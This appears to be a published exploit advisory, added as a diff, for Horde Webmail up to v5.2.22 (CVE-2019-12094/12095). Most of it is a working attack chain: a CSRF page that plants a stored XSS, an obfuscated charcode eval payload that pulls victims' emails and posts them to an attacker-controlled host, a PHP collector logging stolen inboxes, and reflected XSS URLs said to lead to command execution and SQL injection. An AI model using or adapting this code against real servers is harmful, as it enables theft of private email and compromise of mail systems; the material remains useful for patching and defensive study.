@@ -1,0 +1,70 @@
+# Title: Horde Webmail - XSS + CSRF to SQLi, RCE, Stealing Emails <= v5.2.22
+# Date: 17.05.2019
+# Author: InfinitumIT
+# Vendor Homepage: https://www.horde.org/
+# Version: Up to v5.2.22.
+# CVE: CVE-2019-12094 & CVE-2019-12095
+# info@infinitumit.com.tr && numan.ozdemir@infinitumit.com.tr
+# PoC: https://numanozdemir.com/respdisc/horde/horde.mp4
+# Materials: https://numanozdemir.com/respdisc/horde/materials.zip
+
+# Description:
+# Attacker can combine "CSRF vulnerability in Trean Bookmarks (defaultly installed on Horde Groupware)" and
+# "Stored XSS vulnerability in Horde TagCloud (defaultly installed)" vulnerabilities to steal victim's emails.
+
+# Also:
+# Attacker can use 3 different reflected XSS vulnerability to exploit Remote Command Execution, SQL Injection and Code Execution.
+# To steal e-mails, attacker will send an e-mail to victim and victim will click the attacker's website.
+# So, victim's inbox will be dumped in attacker's FTP.
+# All of them vulnerabillities are valid for all Horde Webmail versions.
+
+# Attacker will exploit the CSRF and XSS with: index.html
+# Attacker will steal and post the emails with: stealer.js
+# Attacker will save the emails with: stealer.php
+
+# index.html Codes:
+<script>
+var url = "http://webmail.victimserver.com/trean/";
+var params =  
+'iframe=0&popup=0&newFolder=&actionID=add_bookmark&url=http%3A%2F%2Ftest.com&title=vulnerability&description=vulnerability&treanBookmarkTags=%22%3E%3Cscript%2Fsrc%3D%22http%3A%2F%2Fyourwebsite.com%2Fhorde%2Fstealer.js%22%3E%3C%2Fscript%3E';
+var vuln = new XMLHttpRequest();
+vuln.open("POST", url, true);
+vuln.withCredentials = 'true';
+vuln.setRequestHeader("Content-type",
+"application/x-www-form-urlencoded");
+vuln.send(params);
+</script>
+<embed/src="http://webmail.victimserver.com/services/portal/"/height="1"/width="1">
+
+
+# stealer.js Codes:
+eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,60,115,99,114,105,112,116,32,115,114,99,61,39,104,116,116,112,58,47,47,99,111,100,101,46,106,113,117,101,114,121,46,99,111,109,47,106,113,117,101,114,121,45,51,46,51,46,49,46,109,105,110,46,106,115,39,62,60,47,115,99,114,105,112,116,62,60,115,99,114,105,112,116,62,102,117,110,99,116,105,111,110,32,115,116,101,97,108,40,115,116,97,114,116,44,32,101,110,100,41,123,118,97,114,32,115,116,97,114,116,59,118,97,114,32,101,110,100,59,118,97,114,32,105,59,102,111,114,40,105,61,115,116,97,114,116,59,32,105,60,61,101,110,100,59,32,105,43,43,41,123,36,46,103,101,116,40,39,104,116,116,112,58,47,47,119,101,98,109,97,105,108,46,118,105,99,116,105,109,115,101,114,118,101,114,46,99,111,109,47,105,109,112,47,118,105,101,119,46,112,104,112,63,97,99,116,105,111,110,73,68,61,118,105,101,119,95,115,111,117,114,99,101,38,105,100,61,48,38,109,117,105,100,61,123,53,125,73,78,66,79,88,39,43,105,44,32,102,117,110,99,116,105,111,110,40,100,97,116,97,41,123,118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,109,108,72,116,116,112,46,111,112,101,110,40,39,80,79,83,84,39,44,32,39,104,116,116,112,58,47,47,121,111,117,114,119,101,98,115,105,116,101,46,99,111,109,47,104,111,114,100,101,47,115,116,101,97,108,101,114,46,112,104,112,39,44,32,116,114,117,101,41,59,120,109,108,72,116,116,112,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,32,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,39,41,59,120,109,108,72,116,116,112,46,115,101,110,100,40,39,105,110,98,111,120,61,39,43,100,97,116,97,41,59,125,41,59,125,114,101,116,117,114,110,32,105,59,125,115,116,101,97,108,40,56,44,49,53,41,59,60,47,115,99,114,105,112,116,62,34,41,59,10,47,47,32,115,116,101,97,108,40,120,44,121,41,32,61,32,115,116,101,97,108,32,102,114,111,109,32,105,100,32,120,32,116,111,32,105,100,32,121))
+// It is charcoded, firstly decode and edit for yourself then encode again. Also dont forget to remove spaces!
+
+
+# stealer.php Codes:
+<?php
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Headers: *');
+if($_POST['inbox']){
+$logs = fopen("inbox.txt", "a+");
+$data = $_POST['inbox']."  
+-----------------------------------------------------------------  
+".chr(13).chr(10).chr(13).chr(10);
+fwrite($logs, $data);
+}
+?>
+
+#  
+_____________________________________________________________________________________________________
+
+# Reflected XSS to Remote Command Execution, Remote Code Execution and SQL Injection:
+
+# http://webmail.victimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&form=update_f
+# http://webmailvictimserver.com/groupware/admin/user.php?user_name=XSS-PAYLOAD-HERE&form=remove_f
+# http://webmail.victimserver.com/groupware/admin/config/diff.php?app=XSS-PAYLOAD-HERE
+
+# Attacker can execute commands & PHP codes remotely and inject harmful SQL queries.
+# Also, attacker can create users too with those reflected XSS vulnerabilities.
+
+# Stay Secure with InfinitumIT - infinitumit.com.tr
